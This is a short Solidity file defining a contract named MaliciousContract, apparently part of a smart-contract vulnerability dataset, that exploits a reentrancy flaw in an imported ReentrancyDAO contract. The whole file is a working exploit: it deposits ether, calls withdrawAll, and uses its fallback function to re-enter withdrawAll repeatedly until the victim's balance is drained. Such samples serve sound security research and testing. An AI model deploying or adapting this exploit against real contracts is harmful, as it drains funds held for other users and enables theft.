pragma solidity ^0.4.19;

import "../dataset/reentrancy/reentrancy_dao.sol";

contract MaliciousContract {
    ReentrancyDAO reentrancyDAO;

    constructor(address _victimAddress) public {
        reentrancyDAO = ReentrancyDAO(_victimAddress);
    }

    function attack() public {
        reentrancyDAO.withdrawAll();
    }

    function deposit() public payable {
        require(msg.value >= 1);
        reentrancyDAO.deposit.value(msg.value)();
    }

    function() external payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(reentrancyDAO).balance > 0) {
            reentrancyDAO.withdrawAll();
        }
    }
}
